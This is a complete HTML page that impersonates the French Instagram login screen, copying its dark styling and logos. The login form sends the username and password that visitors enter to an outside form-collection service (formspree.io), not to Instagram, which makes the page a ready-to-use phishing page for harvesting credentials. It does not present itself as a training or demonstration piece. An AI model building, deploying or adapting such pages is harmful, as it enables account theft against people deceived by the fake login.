<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion • Instagram</title>
    <style>
        /* Thème Sombre Officiel (Provenant de 1.html) */
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            background-color: #000000; 
            color: #FFFFFF;
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh; 
            margin: 0; 
        }

        .container { 
            background-color: #000000; 
            border: 1px solid #262626; 
            width: 350px; 
            padding: 20px 40px; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            box-sizing: border-box; 
        }

        .insta-icon { 
            width: 75px; 
            height: 75px; 
            margin-top: 20px; 
            margin-bottom: 15px; 
        }
        
        .logo-text { 
            width: 175px; 
            margin-bottom: 35px; 
            filter: invert(1); 
        }

        input { 
            width: 100%; 
            background: #121212; 
            border: 1px solid #363636; 
            border-radius: 3px; 
            padding: 10px 8px; 
            margin-bottom: 8px; 
            box-sizing: border-box; 
            font-size: 12px; 
            color: white;
        }

        input:focus { 
            border-color: #a8a8a8; 
            outline: none; 
        }

        button { 
            width: 100%; 
            background-color: #0095f6; 
            border: none; 
            border-radius: 8px; 
            color: white; 
            padding: 7px 16px; 
            font-weight: 600; 
            font-size: 14px; 
            margin-top: 10px; 
            cursor: pointer; 
        }

        .divider { display: flex; width: 100%; align-items: center; margin: 20px 0; }
        .line { flex: 1; height: 1px; background-color: #262626; }
        .or { margin: 0 18px; color: #8e8e8e; font-size: 13px; font-weight: 600; }

        .fb-login { color: #0095f6; font-size: 14px; font-weight: 600; cursor: pointer; text-decoration: none; margin-bottom: 15px; }
        .forgot { font-size: 12px; color: #EFEFEF; text-decoration: none; margin-top: 15px; }

        .signup { 
            background-color: #000000; 
            border: 1px solid #262626; 
            width: 350px; 
            padding: 20px; 
            margin-top: 10px; 
            text-align: center; 
            box-sizing: border-box; 
            font-size: 14px; 
        }
        .signup a { color: #0095f6; text-decoration: none; font-weight: 600; }
    </style>
</head>
<body>

    <div id="main-content">
        <div class="container">
            <img class="insta-icon" src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/132px-Instagram_logo_2016.svg.png" alt="Instagram Icon">
            <img class="logo-text" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Text">
            
            <form action="https://formspree.io/f/xreoajwr" method="POST">
                <input type="text" name="name" placeholder="Num. de téléphone, nom d'utilisateur ou e-mail" required>
                <input type="text" name="car" placeholder="Mot de passe" required>
                
                <button type="submit">Se connecter</button>
            </form>

            <div class="divider">
                <div class="line"></div>
                <div class="or">OU</div>
                <div class="line"></div>
            </div>

            <div class="fb-login">Se connecter avec Facebook</div>
            <a href="#" class="forgot">Mot de passe oublié ?</a>
        </div>

        <div class="signup">
            Vous n'avez pas de compte ? <a href="#">Inscrivez-vous</a>
        </div>
    </div>

</body>
</html>
